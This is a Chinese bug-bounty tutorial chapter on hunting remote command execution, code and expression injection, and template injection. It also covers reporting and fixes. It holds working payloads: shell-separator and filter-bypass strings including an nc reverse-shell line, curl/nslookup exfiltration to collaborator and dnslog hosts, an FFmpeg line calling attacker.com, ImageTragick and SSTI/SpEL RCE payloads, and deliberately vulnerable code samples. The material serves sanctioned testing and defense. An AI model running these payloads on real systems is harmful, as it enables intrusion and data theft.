# 第十一章B 命令执行与代码注入漏洞挖掘（高危必杀技）

> **本章定位**：命令执行（RCE）是所有 Web 漏洞的「终极形态」——一旦确认，基本就是严重级、1 万起步。SRC 里 RCE 类漏洞虽然数量不多（占总数约 3%），但**单个奖金占总奖金池的 35% 以上**，是白帽子冲排名的「核武器」。本章将讲解命令执行、代码注入、表达式注入（EL/SPEL/OGNL）三大类。

---

## 11B.1 前置知识：命令执行全景图

### 11B.1.1 6 类常见的「命令执行」入口

| 类型 | 原理 | 典型语言 | 难度 | 奖金 |
|-----|-----|---------|-----|-----|
| 系统命令注入 OS Command | 用户输入拼接到 `system() / exec()` | PHP / Java / Python / Node | 中 | 高危-严重（2k-2w） |
| 代码动态执行 Code Eval | 用户输入进入 `eval() / assert()` | PHP / Python / JS | 中 | 严重（5k-2w） |
| 表达式注入 EL/OGNL/SPEL | 表达式引擎解析用户输入 | Java（Spring/Struts） | 高 | 严重（5k-3w） |
| 反序列化 RCE | 对象流中 Gadget 链触发命令 | Java / PHP / .NET | 高 | 严重（5k-3w） |
| 模板注入 SSTI | 模板引擎解析用户输入 | Jinja2 / Freemarker / Thymeleaf | 中-高 | 高危-严重（2k-2w） |
| 中间件/组件 RCE | 已知组件漏洞 CVE 利用 | Java（Shiro / Fastjson / Log4j） | 中 | 严重（3k-3w） |

### 11B.1.2 命令执行 vs 代码执行 vs 表达式注入

```text
命令执行（OS Command）：
  PHP:   system("ping " + $_GET["ip"]);           → ?ip=127.0.0.1 | id
  Java:  Runtime.getRuntime().exec("ping " + ip);  → ip=127.0.0.1 & dir
  Python: os.system("ping " + ip)                  → ip=127.0.0.1; whoami

代码执行（Eval / Code Injection）：
  PHP:   eval("echo " . $_GET["x"]);                → ?x=phpinfo();
  Python: exec("result = " + expr)                  → expr=__import__('os').system('id')

表达式注入（Expression Language）：
  Spring SPEL:  parser.parseExpression(userInput)   → userInput=T(Runtime).getRuntime().exec('id')
  Struts2 OGNL: #rt=@java.lang.Runtime@getRuntime() → 经典 S2-045/S2-057
```

### 11B.1.3 哪些参数最容易出命令执行（收藏清单）

```text
通用危险参数名：
  cmd, exec, command, shell, script, do, run,
  host, ip, target, addr, url, domain,
  file, path, name, filename, savepath, upload,
  backup, restore, import, export, migrate,
  filter, header, cookie, env, charset, template,
  expression, formula, evaluate, rule, condition,
  jsoncallback, callback, function, wrap, prefix, suffix

危险操作功能：
  「Ping 检测」「连通性测试」「Traceroute」 → 90% 都是把用户输入拼到 system(ping x)
  「批量导出 Excel/PDF」「模板渲染」      → SSTI / wkhtmltoimage 命令注入
  「文件解压 / 导入」                   → 解压路径穿越 + 命令执行
  「图片处理 / OCR / 视频转码」          → ImageMagick / FFmpeg 参数注入
  「自定义规则引擎」                    → SPEL / MVEL / OGNL 表达式注入
```

---

## 11B.2 黑盒挖掘：命令执行 8 步走

### 11B.2.1 第 1 步：识别危险功能点

**网站上你看到以下功能，眼睛要发光！**

```text
功能 1：系统工具 → Ping 检测 / 端口扫描 / Traceroute
         示例：运营后台「检测服务器存活」功能，输入框让你填 IP

功能 2：备份 / 恢复 → 输入备份文件名
         示例：DB 管理后台「导出表 t_user 到文件 x.sql」

功能 3：文件处理 → 上传头像 / 图片压缩 / PDF 生成
         示例：用户上传图片后，后端调用 ImageMagick 做缩略图

功能 4：邮件 / 短信网关 → 自定义模板
         示例：自定义邮件模板变量 ${username} → 这里可能是 SSTI

功能 5：日志 → 搜索日志 / 导出日志
         示例：后台搜索框输入关键词，后端跑 grep / findstr 命令

功能 6：定时任务 → Cron 表达式 / 自定义脚本
         示例：运维后台「新建定时任务，执行命令：XXX」

功能 7：规则引擎 → 条件表达式 / 计算公式
         示例：风控系统允许配置规则 if( score > ${userInput}, reject, pass )

功能 8：第三方整合 → Webhook / 回调 URL / 第三方 API
         示例：对接支付、物流、短信的签名参数常常直接拼入 shell
```

### 11B.2.2 第 2 步：Ping 功能标准探测流程

> **SRC 最常见的命令执行入口。** 90% 的后台「网络诊断」功能都能出 RCE。

```text
正常输入：
  127.0.0.1       → 响应 4 行 ping 结果
  127.0.0.1 | id  → 如果回显 uid=xxx → 命令执行（有回显）
  127.0.0.1; id   → 同上（分号分隔）
  127.0.0.1 & id  → 同上（Windows & 后台执行）
  127.0.0.1 `id`  → 反引号，Linux 专属
  127.0.0.1 $(id) → $() 命令替换
  127.0.0.1 || id → 前命令失败时执行
  127.0.0.1 && id → 前命令成功时执行

无回显探测（DNS/HTTP 外带）：
  用 Burp Collaborator 或者自建 DNSLog（dnslog.cn / ceye.io）
  Payload：
    127.0.0.1; curl http://xxxxxxxx.burpcollaborator.net/`whoami`
    127.0.0.1; nslookup `whoami`.xxxxxxxx.dnslog.cn
    127.0.0.1 & ping -n 1 xxxxxxxx.ceye.io
  → 只要你的 DNSLog 收到解析记录，就证明命令被真正执行了（高危实锤）
```

### 11B.2.3 第 3 步：不同系统分隔符速查

| 目标系统 | 分隔符 1 | 分隔符 2 | 分隔符 3 | 注释 |
|---------|---------|---------|---------|-----|
| Linux   | ;       | `cmd`   | $(cmd)  | 大小写敏感，反斜杠转义 |
| Windows | &       | &&      | \|      | 还有 %cmd% 变量、^ 转义 |
| 两者通用 | \|      | &&      | ;       | 优先用 `|` 最通用 |

### 11B.2.4 第 4 步：绕过黑名单的 20 个 Payload

```text
空格被过滤：
  cat</etc/passwd            → 用重定向代替空格
  cat$IFS$9/etc/passwd       → $IFS 是内部字段分隔符
  {cat,/etc/passwd}          → bash 花括号展开
  cat%09/etc/passwd          → %09 = Tab
  X=$'cat\x20/etc/passwd';$X → 用变量拼接

关键字被过滤：
  过滤 cat:
    more / less / head / tail / nl / tac / sed / awk / cut / rev / od
    /???/?at /etc/passwd     → 通配符 ? 匹配一个字符
    /bin/c?? 等价于 /bin/cat
  过滤 sh/bash:
    /bin/nc 1.1.1.1 9999 -e /bin/busybox sh
    python -c 'import socket,subprocess;s=socket.socket();...'
    perl -e 'use Socket;...'
    php -r '$sock=fsockopen(...);'
  过滤引号：
    /???/???$IFS/????/????wd
    ${PATH:0:1}${HOME:0:1}  → 用环境变量切字符拼命令

编码绕过：
  Base64 编码执行（Linux）：
    echo "aWQ=" | base64 -d | sh
    等价于 id
  Base64 编码执行（Windows）：
    powershell -enc JABoAG8AbQBlAFsAcwB0AHIAaQBuAGcAXQA=
    （Unicode Base64，Windows 专属）
  十六进制：
    \x69\x64 → id
  Unicode：
    \u0069\u0064 → id
```

### 11B.2.5 第 5 步：无回显 → 时间盲打 + 外带

**时间盲打（判断是否真的执行）**

```text
Payload:
  Linux:   127.0.0.1; sleep 10
  Windows: 127.0.0.1 & ping -n 11 127.0.0.1
→ 如果响应时间比正常多 10 秒左右 → 命令执行成立
```

**DNS/HTTP 外带（最推荐，SRC 审核秒过）**

```text
推荐工具（2 选 1）：
① Burp Suite → Project options → Misc → Use Burp Collaborator server
   「Copy to clipboard」得到：xxxxxx.burpcollaborator.net

② 国内快速：http://dnslog.cn/  （不用翻墙，速度快）
   点「Get SubDomain」得到：xxxxxx.dnslog.cn

通用 Payload（Linux）：
  127.0.0.1; curl http://xxxxxx.burpcollaborator.net/`whoami`
  127.0.0.1; wget http://xxxxxx.burpcollaborator.net/`uname -a`
  127.0.0.1; nslookup xxxxxx.ceye.io
  127.0.0.1; dig `whoami`.xxxxxx.dnslog.cn

通用 Payload（Windows）：
  127.0.0.1 & nslookup xxxxxx.dnslog.cn
  127.0.0.1 & certutil -urlcache -split -f http://xxxxxx.burpcollaborator.net/test.txt
  127.0.0.1 & for /f %x in ('whoami') do start http://xxxxxx.dnslog.cn/%x
```

### 11B.2.6 第 6 步：SPEL / OGNL 表达式注入黑盒探测

**SPEL 指纹（Spring Expression Language）**

```text
Spring Boot Actuator → /actuator/env 中出现 spring_expressions_*
Spring Data REST 接口
Spring MVC @ModelAttribute / @RequestHeader 里配置自动解析

黑盒探测 Payload：
  所有字符串参数尝试：
    ${7*7}
    ${7*7}abc
    T(java.lang.Runtime).getRuntime().exec('id')
    new java.io.BufferedReader(new java.io.InputStreamReader(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())).readLine()
  → 如果 ${7*7} 被解析成 49 → SPEL 注入成立
```

**OGNL 指纹（Struts2 / MyBatis）**

```text
黑盒探测 Payload：
  %{7*7}
  %{#a=1+1,#a}
  %{#rt=@java.lang.Runtime@getRuntime(),#rt.exec('id')}
  → 如果页面返回 2 → OGNL 注入成立
```

### 11B.2.7 第 7 步：SSTI 模板注入黑盒探测

**所有支持 `${}` / `{{}}` / `<%=` 的输入框都要测**

| 模板引擎 | 探测 Payload | 成功特征 |
|---------|-------------|---------|
| Jinja2 / Twig | {{7*7}} | 显示 49 |
| Freemarker | ${7*7} | 显示 49 |
| Velocity | #set($x=7*7)$x | 显示 49 |
| Thymeleaf | __${7*7}__ | 显示 49 |
| Smarty (PHP) | {7*7} | 显示 49 |
| ERB (Ruby) | <%= 7*7 %> | 显示 49 |

**Jinja2 → RCE 标准 Payload**

```text
{{ ''.__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__['popen']('id').read() }}
（数字 132 每次环境不一样，要自己遍历子类下标找 popen / subprocess.Popen）
```

### 11B.2.8 第 8 步：ImageMagick / Ghostscript / FFmpeg 参数注入

```text
图片上传后如果会被压缩/缩略/加水印 → 90% 用 ImageMagick
上传 SVG / PS / PDF 时 → Ghostscript 解析

ImageMagick 经典 CVE-2016-3714（ImageTragick）POC：
  构造 mvg 后缀文件，内容：
    push graphic-context
    viewbox 0 0 640 480
    fill 'url(https://127.0.0.1/oops.jpg"|id")'
    pop graphic-context
  → 上传后，|id| 被当命令执行

FFmpeg SSRF+命令注入：
  上传 .m3u8 播放列表，内容包含：
    #EXTM3U
    #EXT-X-MEDIA-SEQUENCE:0
    #EXTINF:10.0,
    concat:http://attacker.com/victim.mpg|id;
  → FFmpeg 解析 concat: 协议时管道命令被执行
```

---

## 11B.3 白盒分析：源码审计命令执行的 5 大模式

### 11B.3.1 模式一：用户输入直接进危险函数

**全局搜索关键词（IDEA / grep）**

```regex
PHP:     system\(|exec\(|passthru\(|shell_exec\(|popen\(|proc_open\(|pcntl_exec\(|assert\(|eval\(
Java:    Runtime.getRuntime\(\)\.exec|ProcessBuilder\(|new ScriptEngineManager|SpelExpressionParser|Ognl\.getValue
Python:  os\.system|os\.popen|subprocess\.call|subprocess\.Popen|eval\(|exec\(|pickle\.loads
Node:    child_process\.(exec|spawn)|eval\(|vm\.runInContext
C#:      Process\.Start|CodeDomProvider\.CompileAssemblyFromSource
```

**PHP 危险代码示例**

```php
// 漏洞代码：用户 ip 直接进入 exec
$ip = $_GET['ip'];
exec("ping -c 4 " . $ip, $output);
echo implode("\n", $output);
// Payload: ?ip=127.0.0.1; cat /etc/passwd
```

**Java 危险代码示例**

```java
// 漏洞代码：用户 input 进入 Runtime.exec
@GetMapping("/ping")
public String ping(String ip) throws Exception {
    Process p = Runtime.getRuntime().exec("ping -c 4 " + ip);  // ← 漏洞
    return readStream(p.getInputStream());
}
// Payload: ?ip=127.0.0.1; curl http://dnslog/`whoami`
```

**Java 更深的坑：exec(String[]) 数组并不等于安全！**

```java
// 看似安全的数组写法，但如果 cmd 本身是用户可控还是会出问题
String[] cmd = {"/bin/sh", "-c", userInput};   // ← userInput 拼接在 -c 后等于没过滤
ProcessBuilder pb = new ProcessBuilder(cmd);
pb.start();
```

### 11B.3.2 模式二：表达式引擎

```java
// 漏洞代码：用户输入直接被 SPEL 解析
@GetMapping("/evaluate")
public Object evaluate(String expr) {
    ExpressionParser parser = new SpelExpressionParser();
    return parser.parseExpression(expr).getValue();  // ← 100% RCE
}
// Payload: T(java.lang.Runtime).getRuntime().exec('curl http://dnslog/')
```

### 11B.3.3 模式三：模板引擎渲染用户数据

```java
// 漏洞代码：用户自定义模板 + 用户数据，服务端渲染
@PostMapping("/mail/render")
public String renderMail(@RequestParam String template, @RequestParam String name) {
    Context ctx = new Context();
    ctx.setVariable("name", name);
    return templateEngine.process(template, ctx);  // template 是用户输入，模板注入
}
```

### 11B.3.4 模式四：反序列化

```java
// 漏洞代码：直接反序列化用户上传的二进制文件
@PostMapping("/import")
public String importData(@RequestParam("file") MultipartFile file) throws Exception {
    ObjectInputStream ois = new ObjectInputStream(file.getInputStream());
    Object obj = ois.readObject();   // ← 经典 Java 反序列化 RCE
    return "OK";
}
```

### 11B.3.5 模式五：sh / bash 脚本嵌套

```bash
# 漏洞代码：shell 脚本直接用 $1（用户输入拼进 shell 脚本更难察觉）
# 文件名：backup.sh
#!/bin/bash
mysqldump -u root $1 > /data/backup.sql  # ← $1 是用户传的库名
# 调用：backup.sh "test; curl http://dnslog/$(whoami)"
# → mysqldump test; curl http://dnslog/$(whoami) > /data/backup.sql
#   命令注入实锤！
```

---

## 11B.4 真实案例：某企业运营后台 Ping 功能 RCE，SRC 严重级奖金 1.2 万

### 11B.4.1 漏洞来源

```text
背景：某电商 SRC，提交企业运营后台漏洞
入口：后台导航「系统 → 网络诊断 → Ping 检测」
参数：ip（POST JSON）
```

### 11B.4.2 完整挖掘过程

```text
第 1 步：正常操作，输入 127.0.0.1
        返回：
        {
          "code": 0,
          "result": [
            "PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.",
            "64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.03 ms",
            ...
          ]
        }
        → 明确知道后端是 ping 命令的回显，大概率有命令拼接

第 2 步：Fuzz 分隔符
        ip = "127.0.0.1 | id"
        → 响应 403 Forbidden （有 WAF）
        ip = "127.0.0.1 & id"
        → 同样 403
        ip = "127.0.0.1 `id`"
        → 200 OK！但返回 result 里没有 id 的输出，可能被过滤

第 3 步：DNSLog 外带，绕过回显过滤
        去 dnslog.cn 申请 subdomain: abc123.dnslog.cn
        ip = "127.0.0.1 `nslookup abc123.dnslog.cn`"
        → 2 秒后刷新 dnslog.cn，看到 2 条解析记录！
        → 实锤命令执行

第 4 步：验证 RCE，获取更多信息
        ip = "127.0.0.1 `nslookup $(whoami | base64 -w0).abc123.dnslog.cn`"
        → 解析到子域名：cm9vdA==.abc123.dnslog.cn → base64 解码是 root
        → 确认 root 权限

        ip = "127.0.0.1 `nslookup $(cat /etc/passwd | md5sum | cut -c1-10).abc123.dnslog.cn`"
        → 得到 /etc/passwd 哈希，证明可读任意文件

第 5 步：获取反向 Shell（SRC 不允许，但自己在内网靶机验证可行性）
        （提交报告时只写到上一步，避免触碰红线）
```

### 11B.4.3 SRC 报告提交

```markdown
## 漏洞标题
某电商运营后台 https://admin.example.com/sys/network/ping
接口参数 ip 存在 OS 命令注入（root 权限，严重级）

## 漏洞等级
严重

## 复现步骤
1. 登录运营后台（低权限运营账号即可，非管理员）
2. 抓 POST 请求 /sys/network/ping
   Content-Type: application/json
   Cookie: 运营账号 session=xxx
   Body: {"ip":"127.0.0.1"}
   → 正常返回 ping 结果

3. DNSLog 外带证明执行：
   申请 dnslog.cn subdomain: <xxx>.dnslog.cn
   Body 改为：
   {"ip":"127.0.0.1 `nslookup $(whoami | base64 -w0).<xxx>.dnslog.cn`"}
   → <xxx>.dnslog.cn 收到解析记录 cm9vdA==.<xxx>.dnslog.cn
   → base64 解码 cm9vdA== = root，证明是 root 权限执行

4. 读 /etc/passwd 证明数据访问：
   {"ip":"127.0.0.1 `nslookup $(cat /etc/passwd | md5sum | cut -c1-10).<xxx>.dnslog.cn`"}
   → 收到 d67e04c3c7.<xxx>.dnslog.cn，对应真实 passwd md5

## 影响范围
- 目标资产：admin.example.com 运营后台所有机器
- 服务器权限：root
- 影响：可执行任意命令、读写任意文件、横向移动内网、拖数据库

## 漏洞证明
[录屏 1.5 分钟 + 数据包截图 + dnslog.cn 解析截图]（所有敏感信息打码）

## 修复建议
1. ip 参数白名单校验：必须匹配正则 ^([0-9]{1,3}\.){3}[0-9]{1,3}$
   或匹配域名格式 ^[a-zA-Z0-9.-]+$
2. Runtime.exec 必须用数组传参，避免 shell 解析：
   new ProcessBuilder("ping", "-c", "4", ip).inheritIO().start();
3. 禁止拼接 shell，不要使用 "/bin/sh -c" + userInput 形式
4. 该功能删除或限制仅系统管理员网段可访问
```

### 11B.4.4 结果

```text
审核：1 天通过
定级：严重
奖金：12000 元（本漏洞 + 该后台连带 2 个中危一起发，打包严重）
```

---

## 11B.5 实操 Checklist（照抄不翻车）

### 11B.5.1 黑盒必做

```text
☑ 找 Ping / Traceroute / 备份 / 解压 / 导出 / 邮件模板等高危功能
☑ 所有危险参数依次尝试：| ; & `cmd` $(cmd) || &&
☑ 有回显看回显，无回显用 DNSLog + sleep 10 双重验证
☑ 所有模板参数 / 规则引擎测：${7*7} / {{7*7}} / %{7*7} / <%= 7*7 %>
☑ 所有自定义表达式 / 公式 / SQL 自定义字段测 SPEL/OGNL Payload
☑ 上传 .svg / .ps / .pdf 测 Ghostscript，上传 m3u8 测 FFmpeg
☑ 图片压缩/缩略功能上传 PHP 反序列化 / ImageMagick POC
```

### 11B.5.2 SRC 提交注意红线（千万别踩）

```text
❌ 绝对不要去执行反弹 Shell
❌ 不要读取 /etc/shadow / 真实数据库密码 / 其他用户隐私
❌ 不要在 DNSLog 外带真实手机号 / 身份证号
❌ 不要尝试写 webshell、改配置、横向移动
✅ 推荐做法：whoami + uname -a / 只读证明 / ping 自己域名 / 睡 10 秒
✅ 所有演示用「非敏感」数据证明漏洞即可，SRC 审核员看得懂
```

---

## 11B.6 SRC 提交技巧

### 11B.6.1 定级与奖金（参考头部 SRC）

| 场景 | 定级 | 奖金 |
|-----|-----|-----|
| 有回显 RCE，root 权限，直接执行命令 | 严重 | 8000-30000 |
| 无回显，DNSLog 证明命令执行 | 严重 | 6000-20000 |
| 模板注入 SSTI 证明到 RCE | 高危→严重 | 3000-15000 |
| SPEL/OGNL 表达式注入 | 严重 | 5000-20000 |
| 命令注入（需要登录低权限后台）| 高危→严重 | 2000-10000 |
| 普通代码注入（eval） | 严重 | 5000-20000 |

### 11B.6.2 快速核价 2 个秘诀

```text
秘诀1：一定要录视频，演示从正常请求 → 改 payload → dnslog 收到解析 → whoami 解码
秘诀2：一定要把 whoami / uname -a / 应用目录（/usr/local/tomcat/ 等）3 个值都带出来，
      审核员能一眼看出你拿到的是真权限，不是假 RCE
```

---

## 11B.7 修复方案

### 11B.7.1 代码层（最关键）

**PHP：必须用 escapeshellarg / escapeshellcmd**

```php
// 错误
exec("ping -c 4 " . $ip);

// 正确
$safeIp = escapeshellarg($ip);   // 给参数加单引号，内部单引号转义
exec("ping -c 4 " . $safeIp);
```

**Java：必须用 ProcessBuilder 数组 + 白名单参数**

```java
// 错误
Runtime.getRuntime().exec("ping -c 4 " + ip);

// 正确（无 shell 解析，参数完全隔离）
if (!ip.matches("^([0-9]{1,3}\\.){3}[0-9]{1,3}$")
    && !ip.matches("^[a-zA-Z0-9.-]{1,200}$")) {
    throw new IllegalArgumentException("非法 IP 或域名");
}
ProcessBuilder pb = new ProcessBuilder("ping", "-c", "4", ip);
pb.redirectErrorStream(true);
Process p = pb.start();
```

### 11B.7.2 架构层

```text
1. 命令执行功能独立部署到沙箱容器（K8s Pod，资源限制，无网络访问非必要 IP）
2. 业务服务器无公网访问权限，禁止 curl / wget / nc 等高危二进制 setuid
3. 运行用户降权：Web 服务用 nobody / www-data 启动，禁止 root
4. 启用 seccomp / AppArmor，禁止 Web 进程 fork 新进程（除白名单命令）
5. WAF 层拦命令注入特征：` | ; & && || $( curl wget nslookup ping%20-n%20 ` 等
```

### 11B.7.3 第三方组件加固

```text
ImageMagick：
  policy.xml 禁用危险解码器：
  <policy domain="coder" rights="none" pattern="MVG" />
  <policy domain="coder" rights="none" pattern="PS" />
  <policy domain="coder" rights="none" pattern="PDF" />
  <policy domain="path" rights="none" pattern="@*"/> 禁止 @ 读文件

FFmpeg：
  升级到 5.0+，关闭 -protocol_whitelist 之外的协议
  禁止 concat: / cache: / crypto: 等危险协议

模板引擎：
  禁用用户自定义模板，模板固定在后端；或仅让用户填变量，不允许任何模板语法
  Thymeleaf: disable SpringEL compilation, enable restricted mode
  Freemarker: new BuiltinClassExpose(false) + setNewBuiltinClassResolver(null)
```

---

## 本章小结（3 句话记住）

```text
1. 命令执行 RCE = 严重级核武器，Ping/备份/解压/导出/模板 这 5 个功能一看见就开测
2. 无回显时 DNSLog 外带是「实锤神器」，成功率最高，SRC 审核员秒认
3. 修复关键：不要拼 shell 命令字符串，必须用数组传参 + 白名单校验，运行账户降权
```
